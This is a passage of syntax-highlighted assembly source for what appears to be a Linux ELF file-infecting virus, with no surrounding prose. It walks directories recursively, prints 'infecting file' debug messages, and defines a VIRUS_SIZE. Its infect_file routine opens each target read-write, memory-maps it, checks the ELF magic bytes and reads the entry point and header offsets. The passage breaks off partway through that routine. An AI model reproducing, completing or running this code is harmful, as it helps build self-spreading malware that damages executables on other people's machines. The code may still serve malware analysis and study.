    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc1">;ptr to ascii filename</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">  </span><span class="sc1">;O_RDONLY</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">0x80</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">jge</span><span class="sc0"> </span><span class="sc5">c1_is_directory</span><span class="sc0"> 
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">error_opening_file</span><span class="sc0">
   </span><span class="sc5">c1_is_directory</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">128</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">  </span><span class="sc1">;;fd</span><span class="sc0">
        
   </span><span class="sc9">%ifdef</span><span class="sc0"> </span><span class="sc5">DEBUG</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">128</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;;debug fd</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">string4a</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">printf</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">    </span><span class="sc1">;;</span><span class="sc0">
   </span><span class="sc9">%endif</span><span class="sc0">

    </span><span class="sc1">;----------chdir path</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">12</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">0x80</span><span class="sc0">  </span><span class="sc1">;SYS chdir    </span><span class="sc0">


    </span><span class="sc1">;----------readdir</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">266</span><span class="sc0">  </span><span class="sc1">;allocate space for dirent</span><span class="sc0">
    </span><span class="sc5">l_readdir</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">89</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">266</span><span class="sc4">+</span><span class="sc2">128</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">;;fd</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">esp</span><span class="sc0">     </span><span class="sc1">;ptr to struct dirent </span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">       
    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">0x80</span><span class="sc0">   </span><span class="sc1">;sys readdir</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">e_l_readdir</span><span class="sc0">
    </span><span class="sc1">;call scan_dir for every file, </span><span class="sc0">
    </span><span class="sc1">;prototipe: scandir(dword [esp+4]=writepermissions,esp+8=ptr to filename) </span><span class="sc0">
    </span><span class="sc1">;if dirent.d_name="." or ".." -&gt; skip</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">10</span><span class="sc4">],</span><span class="sc2">0x002e</span><span class="sc0"> </span><span class="sc1">;if == ".\0" skip</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">skip_l_readdir</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">10</span><span class="sc4">],</span><span class="sc2">0x2e2e</span><span class="sc0"> </span><span class="sc1">;if == ".." skip </span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">skip_l_readdir</span><span class="sc0">
    </span><span class="sc1">;cmp word [esp+10], </span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">266</span><span class="sc4">+</span><span class="sc2">128</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;directory permissions</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0"> </span><span class="sc1">;dirent.d_name is at offset 10</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">scan_dir</span><span class="sc0">  </span><span class="sc1">;;;here be recursive</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">  </span><span class="sc1">;restore writepermissions</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0"> </span><span class="sc1">;restore dirent.d_name is at offset 10</span><span class="sc0">

    </span><span class="sc5">skip_l_readdir</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">l_readdir</span><span class="sc0">   
    </span><span class="sc5">e_l_readdir</span><span class="sc4">:</span><span class="sc0">        
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">266</span><span class="sc0">  </span><span class="sc1">;restore allocated space for dirent</span><span class="sc0">

    </span><span class="sc1">;----------close file descriptor fd</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">6</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">128</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">;;fd</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">0x80</span><span class="sc0">  </span><span class="sc1">;SYS close</span><span class="sc0">
    
    </span><span class="sc1">;----------chdir previous current directory</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">12</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">esp</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">0x80</span><span class="sc0">    

  </span><span class="sc5">error_stat</span><span class="sc4">:</span><span class="sc0">
  </span><span class="sc5">error_opening_file</span><span class="sc4">:</span><span class="sc0">
  </span><span class="sc5">e_scan_dir</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">134</span><span class="sc0">  </span><span class="sc1">;restore all allocated stack   </span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;end scan_dir</span><span class="sc0">



</span><span class="sc9">%ifdef</span><span class="sc0"> </span><span class="sc5">DEBUG</span><span class="sc0">
</span><span class="sc5">string1a</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'uid=%d'</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">string2a</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'gid=%d'</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">string3a</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'arg2 passed (filename)=%s'</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">string4a</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'fd=%u'</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">string5a</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'permissions=%u'</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">string6a</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'stat return=%d'</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">string7a</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'file-type=%u'</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">string8a</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'infecting file: %s'</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">string9a</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'writepermissions= %u'</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">string10a</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'arg1 passed (wp)=%u'</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">string11a</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'current dir=%s'</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">string12a</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'getcwd return=%d'</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc9">%endif</span><span class="sc0">
</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;INFECT</span><span class="sc0">


</span><span class="sc9">%define</span><span class="sc0"> </span><span class="sc5">VIRUS_SIZE</span><span class="sc0"> </span><span class="sc2">0x1000</span><span class="sc0">
</span><span class="sc9">%define</span><span class="sc0"> </span><span class="sc5">STACK2</span><span class="sc0"> </span><span class="sc2">50</span><span class="sc0">


</span><span class="sc5">infect_file</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc1">;the filename to infect is in esi</span><span class="sc0">
    </span><span class="sc1">;-------------------stack2</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc5">STACK2</span><span class="sc0">   </span><span class="sc1">;allocate memory     </span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc5">STACK2</span><span class="sc4">-</span><span class="sc2">44</span><span class="sc4">],</span><span class="sc8">esi</span><span class="sc0">  </span><span class="sc1">;;;;;;;;;;;;;[esp+STACK2-44]=ptr to filename   </span><span class="sc0">
    
</span><span class="sc1">;;open the file# in: ebx (file-name); out: eax (file descriptor);</span><span class="sc0">
</span><span class="sc5">open</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">    </span><span class="sc1">;2=O_RDWR ,but I can open O_RDONLY=0 becouse I read only now</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">0x80</span><span class="sc0">     </span><span class="sc1">;open file</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">jg</span><span class="sc0"> </span><span class="sc5">no_open_error</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">open_error</span><span class="sc0">  </span><span class="sc1">;error opening file, switch to the next file</span><span class="sc0">
    </span><span class="sc5">no_open_error</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc5">STACK2</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">    </span><span class="sc1">;;;;;;;;;;;;;;[esp+STACK2-4]=fd  (read-write)   </span><span class="sc0">
    </span><span class="sc9">%ifdef</span><span class="sc0"> </span><span class="sc5">DEBUG</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">;;debug</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">string1</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">printf</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">
    </span><span class="sc9">%endif</span><span class="sc0">
</span><span class="sc1">;;end open</span><span class="sc0">


</span><span class="sc1">;;ask the kernel the file length, stat struct defined in &lt;asm/stat.h&gt;</span><span class="sc0">
</span><span class="sc1">;;          stat(const char *file_name, struct stat *buf);</span><span class="sc0">
</span><span class="sc5">file_length</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">106</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">  </span><span class="sc1">;filename (assume in esi)</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">64</span><span class="sc0">      </span><span class="sc1">;pass stat struct on the stack, alloca size(64)</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">esp</span><span class="sc0">     </span><span class="sc1">;ecx &lt;- stat struct address</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">0x80</span><span class="sc0">              </span><span class="sc1">;;;SYS stat</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">0x14</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">;filesize</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">64</span><span class="sc0">      </span><span class="sc1">;restore the stack</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc5">STACK2</span><span class="sc4">-</span><span class="sc2">8</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">    </span><span class="sc1">;;;;;;;;;;;;;;[esp+STACK2-8]=file length   </span><span class="sc0">
    </span><span class="sc9">%ifdef</span><span class="sc0"> </span><span class="sc5">DEBUG</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc5">STACK2</span><span class="sc4">-</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">string5</span><span class="sc0"> </span><span class="sc1">;;;debug</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">printf</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">    </span><span class="sc1">;;;</span><span class="sc0">
    </span><span class="sc9">%endif</span><span class="sc0">

</span><span class="sc1">;;map the file into memory [void* mmap(start,length,prot,flags,fd,offset)]</span><span class="sc0">
</span><span class="sc1">;;                      in file &lt;asm/mman.h&gt;</span><span class="sc0">
</span><span class="sc1">;;the arguments stay in a struct that I create in the stack</span><span class="sc0">
</span><span class="sc1">;; mmap_arg_struct in file &lt;usr/src/linux/arch/i386/kernel/sys_i386.c&gt;</span><span class="sc0">
</span><span class="sc5">mmap</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">90</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc5">STACK2</span><span class="sc4">-</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;filelength </span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc5">STACK2</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;fd </span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">24</span><span class="sc0">        </span><span class="sc1">;alloc size of struct mmap_arg_struct</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0"> </span><span class="sc1">;start</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0">   </span><span class="sc1">;len</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">],</span><span class="sc2">3</span><span class="sc0">  </span><span class="sc1">;prot READ-WRITE</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">12</span><span class="sc4">],</span><span class="sc2">2</span><span class="sc0"> </span><span class="sc1">;flag MAP_PRIVATE</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">16</span><span class="sc4">],</span><span class="sc8">edx</span><span class="sc0">     </span><span class="sc1">;fd</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">20</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0"> </span><span class="sc1">;offset</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">esp</span><span class="sc0"> 
    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">0x80</span><span class="sc0">  </span><span class="sc1">;;mmap system call(eax=90,ebx=ptr to mmap_arg_struct)</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">24</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,-</span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">c_mmap</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">mmap_error</span><span class="sc0">
    </span><span class="sc5">c_mmap</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc5">STACK2</span><span class="sc4">-</span><span class="sc2">12</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">    </span><span class="sc1">;;;;;;;;;;;;;;[esp+STACK2-12]=pointer to mapped file</span><span class="sc0">
    </span><span class="sc9">%ifdef</span><span class="sc0"> </span><span class="sc5">DEBUG</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">  </span><span class="sc1">;;;debug</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">string6</span><span class="sc0"> 
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">printf</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">
    </span><span class="sc9">%endif</span><span class="sc0">
</span><span class="sc1">;end mmap</span><span class="sc0">

</span><span class="sc1">;;is suitable(if ELF and there is space for virus in memory)</span><span class="sc0">
</span><span class="sc5">is_suitable</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc1">;scas (scan strings ELF) or repe</span><span class="sc0">
    </span><span class="sc1">;but I coompare only the first 4 bytes ( a dword),so:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc5">STACK2</span><span class="sc4">-</span><span class="sc2">12</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;ptr mapped</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">;.ELF</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0x464c457f</span><span class="sc0">  </span><span class="sc1">;45=E,4c=L,46=F</span><span class="sc0">
    </span><span class="sc9">%ifdef</span><span class="sc0"> </span><span class="sc5">DEBUG</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">string12</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">printf</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc9">%endif</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">c1_is_suitable</span><span class="sc0">
   </span><span class="sc5">error_suitable</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">suit_error</span><span class="sc0">
   </span><span class="sc5">c1_is_suitable</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc1">;now read the ehdr (I need these informations first), but </span><span class="sc0">
</span><span class="sc1">;TODO: I don't want e_phoff or e_shoff &gt; filesz and entry out off range </span><span class="sc0">
   </span><span class="sc5">read_ehdr</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc5">STACK2</span><span class="sc4">-</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">;file len</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">0x130</span><span class="sc0"> 
    </span><span class="sc6">jl</span><span class="sc0"> </span><span class="sc5">error_suitable</span><span class="sc0">   </span><span class="sc1">;error file size too small</span><span class="sc0">
   </span><span class="sc5">c_ehdr</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc5">STACK2</span><span class="sc4">-</span><span class="sc2">12</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">;ptr mapped</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">0x18</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc5">STACK2</span><span class="sc4">-</span><span class="sc2">16</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">   </span><span class="sc1">;;;;;;;;;;;;;;;;[esp+STACK2-16]=e_entry</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">0x1c</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc5">STACK2</span><span class="sc4">-</span><span class="sc2">20</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">   </span><span class="sc1">;;;;;;;;;;;;;;;;[esp+STACK2-20]=e_phoff</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">0x20</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc5">STACK2</span><span class="sc4">-</span><span class="sc2">24</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">   </span><span class="sc1">;;;;;;;;;;;;;;;;[esp+STACK2-24]=e_shoff</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">0x2c</span><span class="sc4">]</span><span class="sc0">    
    </span><span class="sc1">;else save only word, but after don't pop eax </span><span class="sc0">
    </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0xffff</span><span class="sc0"> </span><span class="sc1">;only 2 bytes</span><span class="sc0">
